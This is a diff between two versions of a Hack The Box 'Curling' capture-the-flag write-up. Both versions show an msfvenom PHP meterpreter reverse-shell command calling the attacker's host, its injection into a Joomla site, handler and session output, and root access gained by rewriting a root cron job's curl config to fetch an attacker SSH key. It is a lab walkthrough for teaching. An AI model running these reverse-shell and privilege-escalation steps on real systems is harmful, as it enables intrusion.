@@ -19,31 +19,25 @@ tags:
   - cron
   - php
   - easy
-published: true
+published: false
 ---
 
 ![](/assets/images/htb-writeup-curling/curling_logo.png)
 
 ## Quick summary
 
-- The username for the Joomla site is `Floris` which is the author of posts.
+- The username for the Joomla site is `Floris` as indicated on the main page in one of the post
 - The password is a variant of a word on the main page: `Curling2018!`
 - On the Joomla admin page we can inject a meterpreter reverse shell in the `index.php` file of the template in-use
 - After getting a shell, we can download a password backup file, which is compressed several times, and contains the password for user `floris`
 - User `floris` controls a `input` file used by `curl` running in a root cronjob. We can change the config file so that cURL gets our SSH public key and saves it into the root ssh directory
 
-
-```
-echo "10.10.10.150 curling.htb >> /etc/hosts
-```
-
-
 ### Nmap
 
-Start with a full TCP port scan which only found a webserver running on port 80 and ssh on 22 so not much to really work with.
+Just a webserver running Joomla on port 80
 
 ```
-# Nmap 7.70 scan initiated Tue Dec 11 13:41:24 2018 as: nmap -sSV -p0- -oA nmap_tcp_full curling.htb
+# Nmap 7.70 scan initiated Tue Dec 11 13:41:24 2018 as: nmap -sSV -p0- -oA nmap_tcp_full htb.curling
 Nmap scan report for htb.curling (10.10.10.150)
 Host is up, received user-set (0.038s latency).
 Scanned at 2018-12-11 13:41:59 GMT for 173s
@@ -55,104 +49,94 @@ PORT   STATE SERVICE REASON         VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 208.44 seconds
+Nmap done: 1 IP address (1 host up) scanned in 8.89 seconds
 ```
 
 ### Joomla
 
-Running nikto and joomscan didnt return anything of intreast. So started to have a mooch about noticing the following: 
+Joomscan didn't return anything interesting but the main page has some interesting stuff:
 
-
-1. The site name is **Cewl Curling site!**, a hint to use the [CeWL](https://digi.ninja/projects/cewl.php) tool to scrape a website generating wordlist from it. 
+1. The site name is **Cewl Curling site!**, this is a reference to the cewl tool used to scrape websites for words which are then used to build wordlists.
 
 2. The first post reveals the username for the administrator: `Floris`
 
+3. The first post also contains something which could be used as a password: `curling2018`
+
 ![](/assets/images/htb-writeup-curling/credentials.png)
 
-Next had a look at the source code and noticed the following comment 
+After trying a few variants of the password, I was able to log in as user `Floris` with the password `Curling2018!`
 
-![](/assets/images/htb-writeup-curling/secret.png)
+We can now access the administrator page at [http://curling.htb/administrator/index.php](http://curling.htb/administrator/index.php)
 
-checking `/secret.txt` reveals a base64 string which i decoded to reveal `Curling2018!`
-
-![](/assets/images/htb-writeup-curling/decode.png)
-
-**Username:** Floris
-**Password:** Curling2018!
-
-Now can login to the admin page using the creds above - [http://curling.htb/administrator/index.php](http://curling.htb/administrator/index.php)
-
-![](/assets/images/htb-writeup-curling/login.png)
-
-
-### Getting a Shell 
-
-Time to get a shell 
-
-msfvenom was used to generate a simple php shell 
+I generated a simple PHP meterpreter payload:
 
 ```
-msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.210 LPORT=4446 > php-meterpreter-staged-reverse-tcp-4666.php
+root@ragingunicorn:~/htb/curling# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4444 > shell.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 1112 bytes
 ```
 
-The file upload functionality on the main page was abused to upload the shell sucessfully as it allows php files. 
+Then I added it to the index.php page so i could trigger it by browsing the main page:
 
 ![](/assets/images/htb-writeup-curling/php.png)
 
-setup and run the msf handler
-
 ```
-msf > use exploit/multi/handler
-msf exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
-msf exploit(multi/handler) > set lhost tun0
-msf exploit(multi/handler) > set lport 4446
+msf exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  tun0             yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
 msf exploit(multi/handler) > run
 
-[*] Started reverse TCP handler on 10.10.14.210:4446
+[*] Started reverse TCP handler on 10.10.14.23:4444
 ```
 
-Clicking on the link in the upload dialogue establishes the shell 
-
-`http://10.10.10.150/images/php-meterpreter-staged-reverse-tcp-4666.php`
-
+Getting a shell:
 
 ```
-[*] Sending stage (38247 bytes) to 10.10.10.150
-[*] Meterpreter session 1 opened (10.10.14.210:4666 -> 10.10.10.150:42196) at 2018-12-11 16:43:13 +0000
+[*] Started reverse TCP handler on 10.10.14.23:4444
+[*] Sending stage (37775 bytes) to 10.10.10.150
+[*] Meterpreter session 1 opened (10.10.14.23:4444 -> 10.10.10.150:56220) at 2018-10-27 16:33:27 -0400
 
-msf exploit(multi/handler) > sessions 
-
-Active sessions
-===============
-
-  Id  Name  Type                   Information              Connection
-  --  ----  ----                   -----------              ----------
-  1         meterpreter php/linux  www-data (33) @ curling  10.10.14.210:4666 -> 10.10.10.150:42196 (10.10.10.150)
-
-msf exploit(multi/handler) > sessions -1
-[*] Starting interaction with 1...
-
-meterpreter > sysinfo
-Computer    : curling
-OS          : Linux curling 4.15.0-22-generic #24-Ubuntu SMP Wed May 16 12:15:17 UTC 2018 x86_64
-Meterpreter : php/linux
-meterpreter > getuid
-Server username: www-data (33)
-meterpreter > 
+meterpreter > sessions 1
+[*] Session 1 is already interactive.
+meterpreter > shell
+Process 2047 created.
+Channel 0 created.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-Boom we get a shell as **www-data** :P
+### Escalate to user Floris
 
-
-### Getting User 
-
-unable to read `user.txt` due to insufficient permissons so need to esculate. 
-
-looking around the system there is a intreasting file 
-
-`/home/floris/password_backup`
+User `floris` has a readable file `password_backup`
 
 ```
+cd /home/floris
+ls
+admin-area
+password_backup
+user.txt
 cat password_backup
 00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
 00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
@@ -172,68 +156,58 @@ cat password_backup
 000000f0: 819b bb48                                ...H
 ```
 
-This looks like a **hex dump** 
+This appears to be a bzip2 file but we need to put it back in binary format first, we'll use CyberChef for this:
 
-copied the file of the box and used xxd to convert the file back into binary format
+![](/assets/images/htb-writeup-curling/cyberchef.png)
 
-```
-root@kali2:~/challenges/hackthebox/curling# xxd -r password_backup data.out
-root@kali2:~/challenges/hackthebox/curling# file data.out              
-data.out: bzip2 compressed data, block size = 900k
-root@kali2:~/challenges/hackthebox/curling# cat data.out               
-BZh91AY&SY���H���A��P)ava�:4N���nT#�@%�` 
-"��n�                                    ��z�@�i�4hdi���9�h�Q�dh����4i�5n�׌��Jh��*��}y.�<~�x�>  �sVT�zH�ߢ�1�V��`F���s
-     ۇ7j:X�dR��k�� ���)p�7۫;���9��PC�Y�P	�HB��*	��G� �U@r�rE8P����H#   
-```
+We just hit the *Save to output file* icon to download the `download.dat` file in binary format.
 
-
-# bzip2
-
-the file was confirmed to be a `bzip2` so let's decompress it...
+Confirmed, this is a bzip2 file:
 
 ```
-root@kali2:~/challenges/hackthebox/curling# bzip2 -d data.out
-bzip2: Can't guess original name for data.out -- using data.out.out
+root@ragingunicorn:~/Downloads# file download.dat
+download.dat: bzip2 compressed data, block size = 900k
 ```
 
-# gzip
-
-another compressed file inside 
+Let's decompress it...
 
 ```
-root@kali2:~/challenges/hackthebox/curling# file data.out.out                   
-data.out.out: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size 141
-root@kali2:~/challenges/hackthebox/curling# mv data.out.out data.gz
-root@kali2:~/challenges/hackthebox/curling# gunzip data.gz
-root@kali2:~/challenges/hackthebox/curling# file data
+root@ragingunicorn:~/Downloads# bzip2 -d download.dat
+bzip2: Can't guess original name for download.dat -- using download.dat.out
+root@ragingunicorn:~/Downloads# file download.dat.out
+download.dat.out: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size 141
+```
+
+Geez, another compressed file in it!
+
+```
+root@ragingunicorn:~/Downloads# mv download.dat.out download.gz
+root@ragingunicorn:~/Downloads# gunzip download.gz
+root@ragingunicorn:~/Downloads# file download
 download: bzip2 compressed data, block size = 900k
 ```
 
-# bzip...again
-
-and another...:O
+Now, this is just dumb... 
 
 ```
-root@kali2:~/challenges/hackthebox/curling# mv data password.bz2
-root@kali2:~/challenges/hackthebox/curling# bzip2 -d password.bz2
-root@kali2:~/challenges/hackthebox/curling# file password
+root@ragingunicorn:~/Downloads# mv download password.bz2
+root@ragingunicorn:~/Downloads# bzip2 -d password.bz2
+root@ragingunicorn:~/Downloads# file password
 password: POSIX tar archive (GNU)
 ```
 
-# tar
-
-tar - it keeps on going 
+Let's keep going.
 
 ```
-root@kali2:~/challenges/hackthebox/curling# tar xvf password
+root@ragingunicorn:~/Downloads# tar xvf password.tar
 password.txt
-root@kali2:~/challenges/hackthebox/curling# cat password.txt
+root@ragingunicorn:~/Downloads# cat password.txt
 5d<wdCbdZu)|hChXll
 ```
 
-woop! got there in the end 
+Finally!
 
-Now on the box `su` was used to swtich over to `floris` and get the user flag.
+We can `su` to user `floris` now and get the user flag.
 
 ```
 python3 -c 'import pty;pty.spawn("/bin/sh")'
@@ -249,13 +223,13 @@ floris@curling:~$
 
 ### Privesc
 
-First, let's upload our ssh key so we don't have to rely on that meterpreter shell and get in nice and easy 
+First, let's upload our ssh key so we don't have to rely on that meterpreter shell:
 
 ```
 floris@curling:~$ mkdir .ssh
 mkdir .ssh
-floris@curling:~$ echo "ssh-rsa AAAAB...DhscPOtelvd root@kali2" > .ssh/authorized_keys
-<cPOtelvd root@kali2" > .ssh/authorized_keys
+floris@curling:~$ echo "ssh-rsa AAAAB...DhscPOtelvd root@ragingunicorn" > .ssh/authorized_keys
+<cPOtelvd root@ragingunicorn" > .ssh/authorized_keys
 ```
 
 In `admin-area` folder, there are two files with a timestamp that keeps refreshing every few minutes:
@@ -271,7 +245,7 @@ floris@curling:~/admin-area$ date
 Sat Oct 27 20:40:44 UTC 2018
 ```
 
-looks like there could be a cron job running as root. let's confirm this by running a simple `ps` command in a bash loop:
+There is probably a cron job running as root, let's confirm this by running a simple `ps` command in a bash loop:
 
 ```
 floris@curling:~/admin-area$ while true; do ps waux | grep report | grep -v "grep --color"; done
@@ -284,7 +258,6 @@ root      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/f
 root      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
 root      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
 ```
-
 
 As suspected, a cronjob executes curl using a `input` config file which we can write to.
 
@@ -300,15 +273,15 @@ url = "http://10.10.14.23/key.txt"
 When the cronjob runs, it fetches our public key:
 
 ```
-root@kali2:~/challenges/hackthebox/curling# python -m SimpleHTTPServer 80
+root@ragingunicorn:~/htb/curling# python -m SimpleHTTPServer 80
 Serving HTTP on 0.0.0.0 port 80 ...
-10.10.10.150 - - [11/Dec/2018 16:52:56] "GET /key.txt HTTP/1.1" 200 -
+10.10.10.150 - - [27/Oct/2018 16:52:56] "GET /key.txt HTTP/1.1" 200 -
 ```
 
 We can now SSH in as root:
 
 ```
-root@kali2:~/challenges/hackthebox/curling# ssh root@curling.htb
+root@ragingunicorn:~# ssh root@curling.htb
 Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-22-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -331,6 +304,7 @@ Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-22-generic x86_64)
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
 
+Last login: Tue Sep 25 21:56:22 2018
 root@curling:~# cat root.txt
 82c198...
 ```
